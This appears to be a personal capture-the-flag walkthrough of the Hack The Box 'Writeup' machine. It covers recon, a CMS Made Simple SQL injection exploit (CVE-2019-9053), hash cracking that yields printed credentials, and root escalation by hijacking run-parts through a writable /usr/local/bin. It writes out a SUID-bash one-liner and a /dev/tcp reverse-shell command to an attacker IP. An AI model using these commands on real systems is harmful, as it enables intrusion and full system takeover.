
As common in these Easy machines on HTB I am given the IP Address `10.10.10.138` and from there I have to get the user and system flag

I start with the recon phase and a good tool that will help me in this process is `nmap` to uncover all open ports available
```shell
nmap -A -T4 10.10.10.138
```
![[Pasted image 20251221155721.png]]
From the scan we can see that only 2 ports are open:
- port `22` - open for ssh
- port `80` - open for http holding an Apache web server and it also gives us a hint that there is the `/robots.txt` endpoint available

Checking the Web server present on the IP address I am met with a blue colored page + some text from where I can extract 1 useful info
![[Pasted image 20251221160728.png]]
- We see there present an email address `jkr@writeup.htb` from which I conclusion that maybe the target user is the `jkr` user

Now checking the `/robots.txt` endpoint we find that we are restricted to access the `/writeup/` endpoint, but why not checking it anyway
![[Pasted image 20251221160939.png]]

Now the `/writeup/` endpoint actually presents some content, and some redirects to other pages
![[Pasted image 20251221161704.png]]

The redirects besides the `Home Page` one, contain some reports to various HTB machines:
- `writeup`:
![[Pasted image 20251221161827.png]]
- `blue`:
![[Pasted image 20251221161847.png]]

On the surface I can't see anything interesting so I decided to check with `burpsuite` the requests and responses to/from the webserver

In one of the responses when checking one of the page containing a writeup I learned that the webserver uses `CMS Made Simple` and uses a version from 2019
![[Pasted image 20251226145557.png]]

Because I could not find anything meaningful, I have to follow the lead about CMS Made Simple, so next I have to check for any exploit or vulnerability involving this version

The Internet as awesome as it is, pointed me to the [CVE-2019-9053](https://nvd.nist.gov/vuln/detail/CVE-2019-9053), which in essence it is a SQL Injection vulnerability which exploits CMS Made Simple 2.2.8

Also there is an exploit available for this found here: https://www.exploit-db.com/exploits/46635
	- the exploit will try to inject malicious code through a crafted URL and in the output we should see users and their passwords from the database
	- the exploit also has an option to crack the password using a wordlist similar to `hashcat` or `johntheripper`

The exploit is available on the `exploitdb` so it is very easy to get it on my machine
![[Pasted image 20251226151108.png]]

The cracking option failed but I got a username and a `salt`+`hash` which will help me crack the password
![[Pasted image 20251226154503.png]]
- The username as I predicted was `jkr`

The only thing left to do is to crack the password  and for that I will use `hashcat`
- I copy the `hash:salt` into a file
- Start the crack process
![[Pasted image 20251226154908.png]]
- Now if I enter the command again and use the option `--show` I can see the cracked password which is `raykayjay9`
![[Pasted image 20251226155552.png]]

The final step to gain access to the user account is to `ssh` in that account with the credentials `jkr:raykayjay9` and get the flag
![[Pasted image 20251226155740.png]]

## System Flag

To get the system flag we have to escalate the current privileges to the `root` user ones 

The first thing that pops out is the fact that the user `jkr` is being part of an unusual amount of groups so maybe one of them can be the gateway to the `root` user 
![[Pasted image 20251226191509.png]]
After a search I discovered that most of them are default groups but one of them has some privileges that could help me, that being the `staff` group
- `staff` allows users to add local modifications to the system `/usr/local` without needing root privileges according to the default Debian documentation

In essence being part of group `staff` gives me permissions to write inside `/usr/local`, from which I can access some binary inside `/usr/local/bin` or `/usr/local/sbin` 

Since I cannot see what binaries are in the 2 directories I have to use another tool that lets me see what tools are running on the machine by the `root` user and if one of them is inside one of the 2 directories that interest me

For that I will use https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 which lets a user snoop on processes without root permissions

After I transferred the tool on the target machine in the `/tmp` directory and give it execution permissions I run it and `ssh` from another shell to see which processes start 
![[Pasted image 20251226192935.png]]
So right after we ssh into the target account we can see that a binary called `run-parts` is being used by the root user (because it has `UID=0`) 

Next I decided to see where is this binary located and I found it inside `/bin` directory
![[Pasted image 20251226193142.png]]
- The fact that is part of the `/bin` directory and not `/usr/local/bin` does not affect us at all

As seen above in the `PATH` environmental variable `/usr/local/bin` precedes `/bin` which means that if I create another `run-parts` binary inside the `/usr/local/bin` directory this new one will be run => basically I can run malicious code from the run-parts 
#### Exploit 1

I craft quickly the next exploit and put it inside `/usr/local/bin` dir
```shell
echo '#!/bin/bash\n\n chmod u+s /bin/bash' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts
```
Basically once the `run-parts` binary will get executed will turn `/bin/bash` into an SUID binary, giving me a `root` shell
![[Pasted image 20251226194233.png]]
- it can be seen that the `/bin/bash` binary has the `SUID` bit set

Now when I ssh again into the `jkr` account I get a different view
![[Pasted image 20251226194407.png]]

After I run `/bin/bash -p` to maintain the privileges I get access to the `root` user and I can get the system flag
![[Pasted image 20251226194601.png]]

#### Exploit 2

Another exploit that works:

- I write a script to get a reverse shell and put it into the `run-parts` binary
```shell
echo '#!/bin/bash\n\n/bin/bash -c "'"/bin/bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"'" ' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts
```
- In a terminal on my machine I open a listener with `nc -lvnp 4444` 
- After I `ssh` into `jkr` account on my terminal with the listener active I can see that I got a reverse shell with `root` privileges
![[Pasted image 20251226195620.png]]